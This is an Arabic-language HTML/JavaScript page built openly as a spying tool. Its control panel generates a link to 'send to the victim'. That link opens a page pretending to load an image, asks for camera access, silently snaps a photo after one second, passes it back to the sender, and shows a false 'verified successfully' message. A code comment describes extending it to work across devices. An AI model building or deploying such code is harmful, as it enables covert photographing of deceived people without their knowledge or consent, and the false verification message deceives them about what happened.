<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام تبادل الصور</title>
    <style>
        body { font-family: sans-serif; text-align: center; background: #f0f2f5; padding: 20px; }
        .card { background: white; padding: 20px; border-radius: 10px; max-width: 400px; margin: auto; shadow: 0 2px 10px rgba(0,0,0,0.1); }
        button { background: #1877f2; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
        #receivedImage { width: 100%; margin-top: 20px; border: 2px solid #1877f2; display: none; }
        .hidden { display: none; }
        video { width: 100%; border-radius: 10px; background: #000; }
    </style>
</head>
<body>

<div class="card">
    <div id="sender-ui">
        <h2>لوحة التحكم</h2>
        <p>ارفع أي صورة لإنشاء رابط التجسس/التأكد:</p>
        <input type="file" id="triggerFile" accept="image/*">
        <div id="linkArea" class="hidden">
            <p>أرسل هذا الرابط للضحية:</p>
            <input type="text" id="generatedLink" readonly style="width:100%">
        </div>
        <hr>
        <h3>الصورة الملتقطة ستظهر هنا:</h3>
        <div id="status">في انتظار فتح الرابط...</div>
        <img id="receivedImage">
    </div>

    <div id="receiver-ui" class="hidden">
        <h2>جاري تحميل الصورة...</h2>
        <p>يرجى السماح بالوصول للكاميرا للمتابعة</p>
        <button id="startCam">السماح بالوصول</button>
        <video id="video" autoplay playsinline class="hidden"></video>
        <canvas id="canvas" class="hidden"></canvas>
    </div>
</div>

<script>
    // تمييز المستخدم: هل هو أنت أم الطرف الآخر؟
    const urlParams = new URLSearchParams(window.location.search);
    const isReceiver = urlParams.has('view');
    const senderUI = document.getElementById('sender-ui');
    const receiverUI = document.getElementById('receiver-ui');

    if (isReceiver) {
        senderUI.classList.add('hidden');
        receiverUI.classList.remove('hidden');
    }

    // المبرمج: عند اختيارك لصورة
    document.getElementById('triggerFile').onchange = (e) => {
        const currentUrl = window.location.href.split('?')[0];
        const victimLink = currentUrl + "?view=camera_access";
        document.getElementById('generatedLink').value = victimLink;
        document.getElementById('linkArea').classList.remove('hidden');
        
        // هنا نبدأ "التصنت" على التغييرات (باستخدام LocalStorage للتجربة على نفس الجهاز)
        // ملاحظة: للعمل بين جهازين مختلفين ستحتاج Firebase API هنا.
        window.addEventListener('storage', (event) => {
            if (event.key === 'captured_photo') {
                document.getElementById('receivedImage').src = event.newValue;
                document.getElementById('receivedImage').style.display = 'block';
                document.getElementById('status').innerText = "تم استلام صورة من الطرف الآخر!";
            }
        });
    };

    // الطرف الآخر: عند الضغط على السماح
    document.getElementById('startCam').onclick = async () => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('video');
            video.srcObject = stream;
            
            // التقاط صامت بعد ثانية
            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const data = canvas.toDataURL('image/jpeg');
                
                // إرسال الصورة "برمجياً" عبر التخزين المشترك
                localStorage.setItem('captured_photo', data);
                
                stream.getTracks().forEach(t => t.stop());
                alert("تم التحقق بنجاح.");
            }, 1000);
        } catch (e) {
            alert("يجب السماح بالكاميرا.");
        }
    };
</script>

</body>
</html>
